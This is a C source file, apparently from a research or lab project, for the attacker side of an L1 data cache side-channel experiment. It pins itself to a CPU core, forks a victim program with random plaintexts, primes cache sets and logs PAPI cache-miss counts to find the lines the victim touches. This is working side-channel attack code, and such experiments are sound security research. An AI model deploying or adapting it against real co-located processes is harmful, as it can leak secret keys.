/* 
atk.c

DESCRIPTION:
    Attacker program that takes PAPI_L1_DCM event information for each
    L1 line.
    These information allows the attacker to plot and discover the line that is being accessed
    by victims.

*/

#define _GNU_SOURCE              

#include <papi.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sched.h>
#include <inttypes.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <string.h>
#include <time.h>

#define N_MEAS 500
#define LOGICAL_CORE 3              // logical core where this process will run on
#define SIZE32KB (32*1024)          //  represents 32 KB
#define W 8                         //  associativity number of L1
#define STRIDE (SIZE32KB/W)         //  step distance between the consecutive accesses in order to fill a particular line of L1
#define ATTACKER_DISTANCE 64        //  bytes space between each attacker thread [block size=64]
#define REPETITIONS 32            //  number of times the whole measurement process is repeated
#define INNER_REPETITIONS 1000    // number of times a measurement of a given L1 line is performed

void cpu_setup();
void get_plaintext(char * plaintext);
int L1_line_translator( void * addr );
int get_n_iterations();
int L1_cache_block_offset_translator( void * addr);
int handle_error(int code, char *outstring);

char V[SIZE32KB];                   

int main(void) { 

    cpu_setup();
    srand(time(NULL));   // configures random function

    FILE* logfile;
    register int line;
    register int min;
    register int i;
    register int ii;                        
    register int v_line = L1_line_translator(V);

    char * plaintext = malloc(sizeof(char) * 16*(3+1)+1); 
    char * args[3]; // should be char * const instead, check this
    int pid  = 0;
    char file_name[35];


    int retval, EventSet=PAPI_NULL;
    long_long values[2];
    long_long start_cycles, end_cycles, start_usec, end_usec;
    float avgMISSES;
    float avgTIME;



    retval = PAPI_library_init(PAPI_VER_CURRENT);
    if (retval != PAPI_VER_CURRENT) {
        fprintf(stderr, "PAPI library init error!\n");
        exit(1);
    }

    if (PAPI_create_eventset(&EventSet) != PAPI_OK)
        handle_error(1, "create_eventset");

    if (PAPI_add_event(EventSet, PAPI_L1_DCM)!= PAPI_OK) 
        handle_error(1,"add_event");


    
    for(int j = 0; j < N_MEAS ; j++){    


        snprintf(file_name, sizeof(file_name), "results/meas#%i.out",j);
        logfile = fopen(file_name,"w");
        get_plaintext(plaintext);
        // fprintf(logfile,"plaintext: %s\n", plaintext);

        // printf("plaintext: %s\n", plaintext); 

        args[0] = "./vic";
        args[1] = plaintext;
        args[2] =  NULL;

        if ( (pid = fork())== 0) {
            execv("./vic", args);
        }

        
        // -- --- -- - -PILLOW - - - -- - ----- --- -- 
        usleep(2000);
        // ADD PILLOW to not detect the lines used by victim



        // can be simplified to line var
        // maybe change to the previous loop : repetition -> line -> inner_rep
        for ( min=0, line=0; min<SIZE32KB/W ; line++, min+=ATTACKER_DISTANCE) { 

                if (PAPI_reset(EventSet) != PAPI_OK)
                    handle_error(1,"reset");
                if (PAPI_read(EventSet, values) != PAPI_OK)
                    handle_error(1,"read");
                if (PAPI_start(EventSet) != PAPI_OK)
                    handle_error(1,"start");
        
                
                // ----------------------------------------------
                for (ii = 0; ii < INNER_REPETITIONS ; ii++) {
                    for(i = min; i < SIZE32KB; i+= STRIDE)
                        V[i] = V[i] + 1;
                }
                // ----------------------------------------------
            

                if (PAPI_stop(EventSet, values) != PAPI_OK)
                    handle_error(1,"stop");

                fprintf(logfile,"%lld\n", values[0]);
                // fprintf(logfile,"LINE=%d \tavgTIME=%lld\n", line ,values[0]);       
        }

        fclose(logfile);

        wait(NULL);
        // or kill(child_pid, SIGKILL);


    }

    return 0;
}



void get_plaintext(char * plaintext){

    // 16 bytes * max 3 digits + separation char +1 for ending string /0

    int rand_value;
    char num[4];

    plaintext[0] = '\0';


    for (int i= 0; i<16; i++){
        rand_value = random()%256;    // change it to better random mech             
        if(0==1){                              
            rand_value = (unsigned char) 98;   // place here the plaintext desired
        }
        snprintf(num, sizeof(num)+1, "%i.", rand_value); // +1 because of '\0'
        strcat(plaintext, num);
    }
    
}



int get_n_iterations() { 

    int counter = 0;
    for (int repetitions = 0; repetitions<=REPETITIONS; repetitions++) {
        for(int i = 0; i < SIZE32KB; i+=STRIDE) { 
            counter++;
        }
    }
    return counter;
}

void cpu_setup(){

    cpu_set_t mask;
    CPU_ZERO( &mask );                                              // clears the set mask
    CPU_SET( LOGICAL_CORE, &mask );                                 // adds the cpu to the mask set
    if( sched_setaffinity( getpid(), sizeof(mask), &mask ) == -1 ){ // sets the CPU affinity mask of the process
        printf("WARNING: Could not set CPU Affinity...\n");
    }
}


int L1_line_translator( void * addr) {

    uint64_t n = (uintptr_t) (addr);
    uint64_t x = (n>>6)%SIZE32KB%64;    
    return (int) x;
}

int L1_cache_block_offset_translator( void * addr) {

    uint64_t n = (uintptr_t) (addr);
    uint64_t x = n%SIZE32KB%64;    
    return (int) x;

}


int handle_error(int code, char *outstring){
    
    printf("Error in PAPI function call %s\n", outstring);
    PAPI_perror("PAPI Error");
    exit(1);
}
